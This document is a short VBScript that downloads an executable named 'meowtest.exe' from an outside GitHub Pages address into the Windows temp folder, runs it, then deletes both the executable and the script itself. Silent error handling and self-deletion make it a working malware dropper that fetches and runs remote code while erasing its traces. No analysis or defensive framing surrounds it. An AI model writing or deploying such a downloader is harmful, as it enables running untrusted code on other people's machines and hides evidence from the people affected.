On Error Resume Next ' Enable error handling

' Create necessary objects
Set x = CreateObject("MSXML2.XMLHTTP")
Set fso = CreateObject("Scripting.FileSystemObject")
Set stream = CreateObject("ADODB.Stream")
Set wshShell = CreateObject("WScript.Shell")

' Specify the URL and the temporary file path
url = "https://homleds.github.io/meowtest.exe" ' Change to your file URL
temp = fso.GetSpecialFolder(2) ' Temporary folder
tempFile = temp & "\meowtest.exe" ' Full path to save the downloaded file

' Initialize the XMLHTTP object to download the file
x.Open "GET", url, False
x.Send

' Check if the download was successful
If Err.Number <> 0 Then
    WScript.Echo "Error downloading file: " & Err.Description
    WScript.Quit
End If

' Check the HTTP status code
If x.Status <> 200 Then
    WScript.Echo "Failed to download file. HTTP Status: " & x.Status
    WScript.Quit
End If

' Open the ADODB.Stream object and save the downloaded file
stream.Type = 1 ' Binary data
stream.Open
stream.Write x.responseBody
stream.SaveToFile tempFile, 2 ' Overwrite the file if it exists
stream.Close

' Check if the file was saved successfully
If Not fso.FileExists(tempFile) Then
    WScript.Echo "Failed to save the file."
    WScript.Quit
End If

' Execute the downloaded file
wshShell.Run tempFile, 1, True

' After execution, delete the downloaded file
fso.DeleteFile tempFile

' Delete the VBScript file itself
Set currentScript = WScript.ScriptFullName
fso.DeleteFile currentScript

' Clean up objects
Set x = Nothing
Set fso = Nothing
Set stream = Nothing
Set wshShell = Nothing
Set currentScript = Nothing

On Error GoTo 0 ' Disable error handling
